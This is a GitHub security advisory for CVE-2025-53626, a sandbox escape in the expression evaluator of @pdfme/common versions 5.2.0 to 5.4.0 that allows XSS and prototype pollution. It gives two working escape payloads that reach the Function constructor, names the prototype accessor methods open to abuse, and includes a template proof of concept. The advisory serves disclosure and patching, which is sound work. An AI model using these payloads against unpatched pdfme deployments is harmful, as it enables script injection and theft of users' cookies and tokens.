# [M] @pdfme/common vulnerable to to XSS and Prototype Pollution through its expression evaluation

## Summary
Severity: Medium
Advisory: GHSA-54xv-94qv-2gfg
CVE: CVE-2025-53626
CWE: CWE-1321, CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2025-07-10
Source: https://github.com/advisories/GHSA-54xv-94qv-2gfg
Type: github-advisory

## Affected
- npm: `@pdfme/common` — affected >=5.2.0 <5.4.1

## Details
## Summary
The expression evaluation feature in pdfme 5.2.0 to 5.4.0 contains critical vulnerabilities allowing sandbox escape leading to XSS and prototype pollution attacks.

## Details

### 1. Sandbox Escape Leading to XSS

The expression evaluator's sandbox can be bypassed to execute arbitrary JavaScript code. Attackers can obtain the Function constructor through indirect methods:

```javascript
// Attack vector 1: Using Object.getOwnPropertyDescriptor
{ ((f, g) => f(g(Object), "constructor").value)(Object.getOwnPropertyDescriptor, Object.getPrototypeOf)("alert(location)")() }

// Attack vector 2: Using object property access
{ { f: Object.getOwnPropertyDescriptor }.f({ g: Object.getPrototypeOf }.g(Object), "constructor").value("alert(location)")() }
```

Both payloads bypass the sandbox restrictions and execute `Function("alert(location)")()`.

### 2. Prototype Pollution

The expression evaluator allows access to prototype accessor methods which can be exploited with Object.assign to pollute the prototype chain:
- `__lookupGetter__`
- `__lookupSetter__`
- `__defineGetter__`
- `__defineSetter__`

## Impact

These vulnerabilities allow attackers to:
- Execute arbitrary JavaScript code in the context of the application
- Steal sensitive information including cookies and tokens
- Modify application behavior through prototype pollution
- Potentially perform actions on behalf of users

## Proof of Concept

Loading the following template in pdfme triggers `alert(location)`:

```json
{
  "schemas": [[{
    "name": "field1",
    "type": "text",
    "content": "{ ((f, g) => f(g(Object), 'constructor').value)(Object.getOwnPropertyDescriptor, Object.getPrototypeOf)('alert(location)')() }",
    "position": { "x": 0, "y": 0 },
    "width": 100,
    "height": 100
  }]],
  "basePdf": { "width": 100, "height": 100 },
  "pdfmeVersion": "5.4.0"
}
```

## References
- https://github.com/pdfme/pdfme/security/advisories/GHSA-54xv-94qv-2gfg
- https://nvd.nist.gov/vuln/detail/CVE-2025-53626
- https://github.com/pdfme/pdfme/pull/1117
- https://github.com/pdfme/pdfme/commit/0dd54739acff2c249ed68c001a896bee38f0fd85
- https://github.com/pdfme/pdfme
- https://github.com/pdfme/pdfme/releases/tag/5.4.1
